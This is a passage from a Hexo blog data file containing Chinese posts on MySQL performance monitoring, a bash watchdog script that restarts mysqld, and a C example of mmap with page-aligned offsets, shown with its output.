/>key_buffer_read_hits&nbsp;=&nbsp;(1-key_reads&nbsp;/&nbsp;key_read_requests)&nbsp;*&nbsp;100%<br />key_buffer_write_hits&nbsp;=&nbsp;(1-key_writes&nbsp;/&nbsp;key_write_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Key%&#39;;<br /><br />(4)InnoDB&nbsp;Buffer命中率<br />innodb_buffer_read_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;innodb_buffer_pool_reads&nbsp;/&nbsp;innodb_buffer_pool_read_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_buffer_pool_read%&#39;;<br /><br />(5)Query&nbsp;Cache命中率<br />Query_cache_hits&nbsp;=&nbsp;(Qcahce_hits&nbsp;/&nbsp;(Qcache_hits&nbsp;+&nbsp;Qcache_inserts&nbsp;))&nbsp;*&nbsp;100%;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Qcache%&#39;;<br />(6)Table&nbsp;Cache状态量<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;open%&#39;;<br /><br />(7)Thread&nbsp;Cache&nbsp;命中率<br />Thread_cache_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;Threads_created&nbsp;/&nbsp;connections&nbsp;)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Thread%&#39;;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Connections&#39;;<br /><br />(锁定状态<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;%lock%&#39;;<br /><br />(9)复制延时量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;slave&nbsp;status<br /><br />(10)&nbsp;Tmp&nbsp;Table&nbsp;状况(临时表状况)<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Create_tmp%&#39;;<br />(11)&nbsp;Binlog&nbsp;Cache&nbsp;使用状况<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Binlog_cache%&#39;;<br /><br />(12)&nbsp;Innodb_log_waits&nbsp;量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_log_waits&#39;;<br /><br />开源监控软件<br />一，RRDTool<br />二，Nagios<br />三，MRTG<br />四，Cacti<br /></p>","site":{"data":{}},"excerpt":"","more":"<p>MySQL性能监控小知识<br /><br />一，获取mysql用户下的进程总数<br /><br />ps&nbsp;-ef&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$1}&#39;&nbsp;|&nbsp;grep&nbsp;&quot;mysql&quot;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&quot;grep&quot;&nbsp;|&nbsp;wc-1<br /><br />二，主机性能状态<br /><br />#&nbsp;uptime<br />[root@&nbsp;~]#&nbsp;uptime<br />13:05:52&nbsp;up&nbsp;53&nbsp;days,&nbsp;52&nbsp;min,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br /><br />三，CPU使用率<br /><br />#&nbsp;top<br />或<br />#&nbsp;vmstat<br /><br />四，磁盘IO量<br /><br />#&nbsp;vmstat&nbsp;或&nbsp;#&nbsp;iostat<br />五，swap进出量[内存]<br /><br />#&nbsp;free<br />六，数据库性能状态<br />(1)QPS(每秒Query量)<br />QPS&nbsp;=&nbsp;Questions(or&nbsp;Queries)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;/*50000&nbsp;global&nbsp;*/&nbsp;status&nbsp;like&nbsp;&#39;Question&#39;;<br /><br />(2)TPS(每秒事务量)<br />TPS&nbsp;=&nbsp;(Com_commit&nbsp;+&nbsp;Com_rollback)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_commit&#39;;<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_rollback&#39;;<br /><br />(3)key&nbsp;Buffer&nbsp;命中率<br />key_buffer_read_hits&nbsp;=&nbsp;(1-key_reads&nbsp;/&nbsp;key_read_requests)&nbsp;*&nbsp;100%<br />key_buffer_write_hits&nbsp;=&nbsp;(1-key_writes&nbsp;/&nbsp;key_write_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Key%&#39;;<br /><br />(4)InnoDB&nbsp;Buffer命中率<br />innodb_buffer_read_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;innodb_buffer_pool_reads&nbsp;/&nbsp;innodb_buffer_pool_read_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_buffer_pool_read%&#39;;<br /><br />(5)Query&nbsp;Cache命中率<br />Query_cache_hits&nbsp;=&nbsp;(Qcahce_hits&nbsp;/&nbsp;(Qcache_hits&nbsp;+&nbsp;Qcache_inserts&nbsp;))&nbsp;*&nbsp;100%;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Qcache%&#39;;<br />(6)Table&nbsp;Cache状态量<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;open%&#39;;<br /><br />(7)Thread&nbsp;Cache&nbsp;命中率<br />Thread_cache_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;Threads_created&nbsp;/&nbsp;connections&nbsp;)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Thread%&#39;;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Connections&#39;;<br /><br />(锁定状态<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;%lock%&#39;;<br /><br />(9)复制延时量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;slave&nbsp;status<br /><br />(10)&nbsp;Tmp&nbsp;Table&nbsp;状况(临时表状况)<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Create_tmp%&#39;;<br />(11)&nbsp;Binlog&nbsp;Cache&nbsp;使用状况<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Binlog_cache%&#39;;<br /><br />(12)&nbsp;Innodb_log_waits&nbsp;量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_log_waits&#39;;<br /><br />开源监控软件<br />一，RRDTool<br />二，Nagios<br />三，MRTG<br />四，Cacti<br /></p>"},{"title":"mysqld守护脚本","date":"2011-04-28T08:23:00.000Z","_content":"#!/bin/sh<br />#This is check msyqld shell<br />#by:key1088@163.com<br />#守护mysqld脚本，防止意外崩溃。\n#如果连接启动10次，依旧启动不来了。停止（可以写成运行某个程序），解决内存。\n&nbsp;\n<strong>ERRLOG=/videodata/mysqldata/data/CHINASOFT.err<br />load_mysqld ()<br />{<br />/etc/init.d/mysqld start<br />}<br /><br />while&nbsp; true<br />do<br />&nbsp; i=1<br />&nbsp; PRO=<code>ps aux|grep mysqld|grep -v grep</code><br />&nbsp; if [ -z &quot;$PRO&quot; ]<br />&nbsp; then<br />&nbsp; &nbsp;&nbsp;&nbsp; while true<br />&nbsp; &nbsp;&nbsp;&nbsp; do<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if [ -z &quot;$PRO&quot; ]<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; then<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; load_mysqld<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code>&nbsp;&nbsp; $0 LOAD MSYQLD-[$i]&quot; &gt;&gt; $ERRLOG<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sleep 20<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; PRO=<code>ps aux|grep mysqld|grep -v grep</code><br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if [ -z &quot;$PRO&quot; ]<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; then&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; i=$((i+1))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fi<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fi<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if [ $i -eq 10 ]<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; then<br />&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code> HR_MYSQL_SAFE.SH LOAD MSQQLD --STOP&quot; &gt;&gt; $ERRLOG<br />&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp; exit 1<br />&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; fi<br />&nbsp; &nbsp;&nbsp;&nbsp; done<br />&nbsp; fi<br />&nbsp; sleep 20<br />done</strong>","source":"_posts/mysqld守护脚本.md","raw":"title: mysqld守护脚本\ncategories: [Mysql]\ntags: []\ndate: 2011-04-28 16:23:00\n---\n#!/bin/sh<br />#This is check msyqld shell<br />#by:key1088@163.com<br />#守护mysqld脚本，防止意外崩溃。\n#如果连接启动10次，依旧启动不来了。停止（可以写成运行某个程序），解决内存。\n&nbsp;\n<strong>ERRLOG=/videodata/mysqldata/data/CHINASOFT.err<br />load_mysqld ()<br />{<br />/etc/init.d/mysqld start<br />}<br /><br />while&nbsp; true<br />do<br />&nbsp; i=1<br />&nbsp; PRO=<code>ps aux|grep mysqld|grep -v grep</code><br />&nbsp; if [ -z &quot;$PRO&quot; ]<br />&nbsp; then<br />&nbsp; &nbsp;&nbsp;&nbsp; while true<br />&nbsp; &nbsp;&nbsp;&nbsp; do<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if [ -z &quot;$PRO&quot; ]<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; then<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; load_mysqld<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code>&nbsp;&nbsp; $0 LOAD MSYQLD-[$i]&quot; &gt;&gt; $ERRLOG<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sleep 20<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; PRO=<code>ps aux|grep mysqld|grep -v grep</code><br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if [ -z &quot;$PRO&quot; ]<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; then&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; i=$((i+1))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fi<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fi<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if [ $i -eq 10 ]<br />&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; then<br />&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code> HR_MYSQL_SAFE.SH LOAD MSQQLD --STOP&quot; &gt;&gt; $ERRLOG<br />&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp; exit 1<br />&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; fi<br />&nbsp; &nbsp;&nbsp;&nbsp; done<br />&nbsp; fi<br />&nbsp; sleep 20<br />done</strong>","slug":"mysqld守护脚本","published":1,"updated":"2023-04-22T05:38:44.839Z","_id":"clgrjlxi2004l7opi3hs321d6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#!&#x2F;bin&#x2F;sh<br />#This is check msyqld shell<br />#by:<a href=\"mailto:&#107;&#x65;&#121;&#49;&#48;&#x38;&#x38;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;\">&#107;&#x65;&#121;&#49;&#48;&#x38;&#x38;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a><br />#守护mysqld脚本，防止意外崩溃。<br>#如果连接启动10次，依旧启动不来了。停止（可以写成运行某个程序），解决内存。<br>&amp;nbsp;<br><strong>ERRLOG&#x3D;&#x2F;videodata&#x2F;mysqldata&#x2F;data&#x2F;CHINASOFT.err<br />load_mysqld ()<br />{<br />&#x2F;etc&#x2F;init.d&#x2F;mysqld start<br />}<br /><br />while&amp;nbsp; true<br />do<br />&amp;nbsp; i&#x3D;1<br />&amp;nbsp; PRO&#x3D;<code>ps aux|grep mysqld|grep -v grep</code><br />&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp; then<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; while true<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; do<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; load_mysqld<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code>&amp;nbsp;&amp;nbsp; $0 LOAD MSYQLD-[$i]&quot; &gt;&gt; $ERRLOG<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; sleep 20<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; PRO&#x3D;<code>ps aux|grep mysqld|grep -v grep</code><br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; i&#x3D;$((i+1))<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; break<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ $i -eq 10 ]<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code> HR_MYSQL_SAFE.SH LOAD MSQQLD –STOP&quot; &gt;&gt; $ERRLOG<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; exit 1<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; done<br />&amp;nbsp; fi<br />&amp;nbsp; sleep 20<br />done</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<p>#!&#x2F;bin&#x2F;sh<br />#This is check msyqld shell<br />#by:<a href=\"mailto:&#107;&#x65;&#121;&#49;&#48;&#x38;&#x38;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;\">&#107;&#x65;&#121;&#49;&#48;&#x38;&#x38;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a><br />#守护mysqld脚本，防止意外崩溃。<br>#如果连接启动10次，依旧启动不来了。停止（可以写成运行某个程序），解决内存。<br>&amp;nbsp;<br><strong>ERRLOG&#x3D;&#x2F;videodata&#x2F;mysqldata&#x2F;data&#x2F;CHINASOFT.err<br />load_mysqld ()<br />{<br />&#x2F;etc&#x2F;init.d&#x2F;mysqld start<br />}<br /><br />while&amp;nbsp; true<br />do<br />&amp;nbsp; i&#x3D;1<br />&amp;nbsp; PRO&#x3D;<code>ps aux|grep mysqld|grep -v grep</code><br />&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp; then<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; while true<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; do<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; load_mysqld<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code>&amp;nbsp;&amp;nbsp; $0 LOAD MSYQLD-[$i]&quot; &gt;&gt; $ERRLOG<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; sleep 20<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; PRO&#x3D;<code>ps aux|grep mysqld|grep -v grep</code><br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; i&#x3D;$((i+1))<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; break<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ $i -eq 10 ]<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code> HR_MYSQL_SAFE.SH LOAD MSQQLD –STOP&quot; &gt;&gt; $ERRLOG<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; exit 1<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; done<br />&amp;nbsp; fi<br />&amp;nbsp; sleep 20<br />done</strong></p>\n"},{"title":"mmap offset偏移量的简单使用","date":"2013-04-18T14:50:09.000Z","_content":"mmap原型为：\n</pre>\nSYNOPSIS\n       #include <sys/mman.h>\n       void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);\n       int munmap(void *addr, size_t length);\n</pre>\noffset 必须为PAGE_SIZE的整数倍\nLINUX下面获取PAGE_SIZE的命令\n<pre>\nroot@bt:~/c# getconf PAGE_SIZE\n4096\n</pre>\n<pre>\nroot@bt:~/c# cat mmap.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n\tchar buff[1024];\n\tchar *mmaped;\n\tint fd;\n\tint offset, realOffset, length, realLen;\n\tif(argc != 4) {\n\t\tprintf(\"Usage:%s <filename> <offset> <length>n\", argv[0]);\n\t\texit(1);\n\t}\n\tif((fd=open(argv[1], O_RDWR)) < 0) {\n\t\tperror(\"open\");\n\t\texit(1);\n\t}\n\toffset = atoi(argv[2]);\n\tlength = atoi(argv[3]);\n\tprintf(\"System Page_Size:[%ld]n\", sysconf(_SC_PAGE_SIZE));\n\trealOffset = offset & ~(sysconf(_SC_PAGE_SIZE) - 1);  //必须为PAGE_SIZE倍数\n\tprintf(\"realOffset:[%d]n\", realOffset);\n\trealLen = length + offset - realOffset;\n\tprintf(\"realLen:[%d]n\", realLen);\n\tif((mmaped = mmap(NULL, realLen, PROT_READ|PROT_WRITE, MAP_SHARED, fd, realOffset)) == (void *)-1) {\n\t\tperror(\"mmap\");\n\t\texit(1);\n\t}\n\tclose(fd);\n\tmemset(buff,0x00,sizeof(buff));\n\tmemcpy(buff, mmaped, realLen);\n\tprintf(\"buff:[%s]n\", buff);\n\tmunmap(mmaped, realLen);\n\treturn 0;\n}\nroot@bt:~/c# gcc mmap.c\nroot@bt:~/c# ./a.out data.txt 4096  7\nSystem Page_Size:[4096]\nrealOffset:[4096]\nrealLen:[7]\nbuff:[567890\n]\nroot@bt:~/c# ./a.out data.txt 1  7\nSystem Page_Size:[4096]\nrealOffset:[0]\nrealLen:[8]\nbuff:[12345678]\nroot@bt:~/c#\n</pre>","source":"_posts/mmap-offset偏移量的简单使用.md","raw":"title: mmap offset偏移量的简单使用\ncategories: [程序设计,C编程]\ntags: []\ndate: 2013-04-18 22:50:09\n---\nmmap原型为：\n</pre>\nSYNOPSIS\n       #include <sys/mman.h>\n       void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);\n       int munmap(void *addr, size_t length);\n</pre>\noffset 必须为PAGE_SIZE的整数倍\nLINUX下面获取PAGE_SIZE的命令\n<pre>\nroot@bt:~/c# getconf PAGE_SIZE\n4096\n</pre>\n<pre>\nroot@bt:~/c# cat mmap.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n\tchar buff[1024];\n\tchar *mmaped;\n\tint fd;\n\tint offset, realOffset, length, realLen;\n\tif(argc != 4) {\n\t\tprintf(\"Usage:%s <filename> <offset> <length>n\", argv[0]);\n\t\texit(1);\n\t}\n\tif((fd=open(argv[1], O_RDWR)) < 0) {\n\t\tperror(\"open\");\n\t\texit(1);\n\t}\n\toffset = atoi(argv[2]);\n\tlength = atoi(argv[3]);\n\tprintf(\"System Page_Size:[%ld]n\", sysconf(_SC_PAGE_SIZE));\n\trealOffset = offset & ~(sysconf(_SC_PAGE_SIZE) - 1);  //必须为PAGE_SIZE倍数\n\tprintf(\"realOffset:[%d]n\", realOffset);\n\trealLen = length + offset - realOffset;\n\tprintf(\"realLen:[%d]n\", realLen);\n\tif((mmaped = mmap(NULL, realLen, PROT_READ|PROT_WRITE, MAP_SHARED, fd, realOffset)) == (void *)-1) {\n\t\tperror(\"mmap\");\n\t\texit(1);\n\t}\n\tclose(fd);\n\tmemset(buff,0x00,sizeof(buff));\n\tmemcpy(buff, mmaped, realLen);\n\tprintf(\"buff:[%s]n\", buff);\n\tmunmap(mmaped, realLen);\n\treturn 0;\n}\nroot@bt:~/c# gcc mmap.c\nroot@bt:~/c# ./a.out data.txt 4096  7\nSystem Page_Size:[4096]\nrealOffset:[4096]\nrealLen:[7]\nbuff:[567890\n]\nroot@bt:~/c# ./a.out data.txt 1  7\nSystem Page_Size:[4096]\nrealOffset:[0]\nrealLen:[8]\nbuff:[12345678]\nroot@bt:~/c#\n</pre>","slug":"mmap-offset偏移量的简单使用","published":1,"updated":"2023-04-22T05:38:44.833Z","_id":"clgrjlxi3004n7opi3nmw92tr","comments":1,"layout":"post","photos":[],"link":"","content":"<p>mmap原型为：<br></pre><br>SYNOPSIS<br>       #include &lt;sys&#x2F;mman.h&gt;<br>       void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);<br>       int munmap(void *addr, size_t length);<br></pre><br>offset 必须为PAGE_SIZE的整数倍<br>LINUX下面获取PAGE_SIZE的命令</p>\n<pre>\nroot@bt:~/c# getconf PAGE_SIZE\n4096\n</pre>\n<pre>\nroot@bt:~/c# cat mmap.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n    char buff[1024];\n    char *mmaped;\n    int fd;\n    int offset, realOffset, length, realLen;\n    if(argc != 4) {\n        printf(\"Usage:%s <filename> <offset> <length>n\", argv[0]);\n        exit(1);\n    }\n    if((fd=open(argv[1], O_RDWR)) < 0) {\n        perror(\"open\");\n        exit(1);\n    }\n    offset = atoi(argv[2]);\n    length = atoi(argv[3]);\n    printf(\"System Page_Size:[%ld]n\", sysconf(_SC_PAGE_SIZE));\n    realOffset = offset & ~(sysconf(_SC_PAGE_SIZE) - 1);  //必须为PAGE_SIZE倍数\n    printf(\"realOffset:[%d]n\", realOffset);\n    realLen = length + offset - realOffset;\n    printf(\"realLen:[%d]n\", realLen);\n    if((mmaped = 